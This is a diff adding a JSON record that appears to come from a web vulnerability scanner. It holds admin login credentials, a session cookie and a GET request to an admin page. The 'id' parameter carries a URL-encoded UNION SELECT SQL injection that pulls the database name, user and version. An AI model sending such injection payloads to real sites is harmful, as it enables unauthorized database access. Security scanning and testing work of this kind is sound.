@@ -1,1 +1,26 @@
-[]
+[
+  {
+    "loginpayload": {
+      "username": "admin@admin.com", 
+      "password": "admin"
+    }, 
+    "url": "https://app4.com/admin/project.php", 
+    "param": {
+      "id": [
+        "1%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+"
+      ], 
+      "op": [
+        "edit_component"
+      ]
+    }, 
+    "headers": {
+      "cookie": "PHPSESSID=v50ojcthg4ccjcu572ldcn2lc7", 
+      "referer": "https://app4.com/index.php", 
+      "user-agent": "Scrapy/1.0.5 (+http://scrapy.org)"
+    }, 
+    "newurl": "https://app4.com/admin/project.php?id=1%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+&op=edit_component", 
+    "loginrequired": "true", 
+    "loginurl": "https://app4.com/index.php", 
+    "type": "GET"
+  }
+]
